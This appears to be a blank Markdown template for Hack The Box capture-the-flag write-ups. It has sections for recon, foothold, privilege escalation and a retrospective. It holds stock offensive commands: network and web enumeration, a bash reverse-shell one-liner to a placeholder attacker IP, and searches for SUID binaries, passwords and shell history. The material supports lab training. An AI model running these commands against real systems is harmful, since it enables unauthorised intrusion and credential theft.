---
title: "{{machine_name}}"
platform: HTB
os: Linux
status: In Progress
difficulty:
released:
retired:
started:
completed:
time_to_root:
tags:
  - ctf
  - htb
draft: true
---

# {{Machine Name}}

## 🎯 At a Glance

*Fill this section LAST. It's the only part future-you will actually re-read — treat it as the abstract of a paper.*

**One-liner:** _What was the core vulnerability, in one sentence?_

**Attack path:**
`Foothold vector` → `Initial shell` → `Lateral/privesc technique` → `Root`

**Novel technique(s) learned:** _Anything you hadn't seen before — this is the whole point of keeping writeups._

**If I saw this again, I'd immediately think:** _The one-sentence pattern-match cue for your future self — e.g. "403 on a specific path + custom header = ACL bypass via X-Original-URL."_

---

## 🧭 Recon

### Network Sweep

```bash
nmap -sC -sV -T4 -oA nmap/initial TARGET_IP
nmap -p- --min-rate=2000 -T4 -oA nmap/full TARGET_IP
# UDP top ports if nothing promising on TCP
nmap -sU --top-ports 100 -oA nmap/udp TARGET_IP
```

| Port | Service | Version | Notes |
| ---- | ------- | ------- | ----- |
|      |         |         |       |

> [!tip] Hosts file
> `echo "TARGET_IP target.htb" | sudo tee -a /etc/hosts`

### Attack Surface Map

*Before diving into any one service, list every door you could knock on. This is what stops you from tunnel-visioning on the first thing you find.*

| Surface | Interesting? | Why |
| ------- | ------------- | --- |
| Port 22 (SSH) |  |  |
| Port 80/443 (Web) |  |  |
| Port 445 (SMB) |  |  |
| Other |  |  |

### Web Enumeration

```bash
whatweb http://target.htb
gobuster dir -u http://target.htb \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip -o gobuster.out

ffuf -u http://target.htb -H "Host: FUZZ.target.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs <baseline_size> -o ffuf-vhosts.json
```

> [!warning] Cheap wins before brute-force
> `robots.txt`, `sitemap.xml`, page source / JS files, response headers, cookies, and the `Server`/`X-Powered-By` headers. Ten seconds of looking here regularly saves twenty minutes of wordlist grinding.

### Service-Specific Enumeration

```bash
# SMB
smbclient -L //TARGET_IP -N && smbmap -H TARGET_IP && enum4linux -a TARGET_IP

# FTP
ftp TARGET_IP   # try anonymous:anonymous

# SNMP
snmpwalk -c public -v1 TARGET_IP

# LDAP
ldapsearch -x -H ldap://TARGET_IP -b "dc=target,dc=htb"
```

### Findings Log

*Every "huh, that's odd" moment goes here immediately — don't trust yourself to remember it three hours later.*

- [ ]
- [ ]
- [ ]

### Credentials / Secrets Found

| Value | Type (user/pass/hash/key) | Source | Status |
| ----- | -------------------------- | ------ | ------ |
|       |                             |        | untested |

---

## 🔓 Foothold

> [!danger] Vulnerability
> **Class:** e.g. SSTI, SQLi, deserialization, file upload, auth bypass
> **CWE / CVE:** if applicable
> **Location:** exact endpoint, parameter, or file

### How I Found It

*Narrate the actual discovery path — not the polished version. This is the part that trains your instincts for next time.*

### Proof of Concept

```bash
# Minimal request that proves the bug
```

### Weaponized Payload

```bash
# Payload that gets code execution / the actual objective
```

### Why It Works

*Explain the root cause in your own words — the code/config flaw that made this possible, not just "it's SSTI." If you can't explain why, you've memorized a payload, not learned a vulnerability class.*

### Shell

```bash
# Listener
pwncat-cs -lp 4444   # or: nc -lvnp 4444

# Trigger (URL-encode if needed)
bash -c 'bash -i >& /dev/tcp/ATTACK_IP/4444 0>&1'
```

> [!success] Shell obtained — `whoami` / shell type here
> Stabilize: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl+Z` → `stty raw -echo; fg` → `export TERM=xterm`

---

## 🚩 User Flag

```bash
find / -name user.txt 2>/dev/null
cat /home/{{user}}/user.txt
```

> [!example] `HTB{...}`

---

## 📈 Privilege Escalation

### Enumeration

```bash
id; whoami; hostname; uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null      # SUID
find / -perm -2000 -type f 2>/dev/null      # SGID
getcap -r / 2>/dev/null                     # capabilities
find / -writable -not -path "*/proc/*" 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
cat ~/.bash_history 2>/dev/null
grep -ri "password" /var/www /opt /etc 2>/dev/null
```

> [!warning] Manual before automated
> Run the quick checks above before LinPEAS — they're faster, quieter, and you actually understand what triggered when you find something yourself. Automate only once manual checks are exhausted.

**Checklist:**

- [ ] `sudo -l` — NOPASSWD or GTFOBins-exploitable binary
- [ ] SUID/SGID binary → [[GTFOBins]]
- [ ] Writable cron job / systemd service / PATH hijack
- [ ] Stored creds (configs, `.env`, history, memory)
- [ ] Capabilities abuse (`cap_setuid`, etc.)
- [ ] Kernel exploit (`uname -r` against known CVEs)
- [ ] Container escape / docker group membership
- [ ] Credential reuse from earlier enumeration

### The Vector

> [!danger] Privesc Vector
> **Type:**
> **Evidence:**

```bash
# Exploit
```

**Why it works:**

---

## 🚩 Root Flag

```bash
cat /root/root.txt
```

> [!example] `HTB{...}`

---

## 🧠 Retrospective

*This is the section that actually makes you better at the next box — don't skip it just because you got the flags.*

### What Worked

-

### Dead Ends & Rabbit Holes

*What looked promising and wasted your time — the goal is to recognize the shape of a rabbit hole faster next time.*

-

### What I'd Do Differently

-

### Transferable Rule

*One sentence, phrased as a rule you can apply to a different box: "Always check X before Y."*

-

---

## 🗂️ Reference

### Tools Used

| Tool | Purpose |
| ---- | ------- |
| `nmap` | Port/service discovery |
| `gobuster` / `ffuf` | Content & vhost discovery |
| `pwncat-cs` | Shell handling & file transfer |
| `linpeas` | Automated privesc enumeration |

### Full Command Log

*Optional — paste your terminal history here if you want a complete audit trail, e.g. for OSCP-style documentation practice.*

```bash

```

### Links

- [ ] CVE / advisory
- [ ] GTFOBins entry
- [ ] Blog post or technique reference this drew on

---

_Author: | Date:_
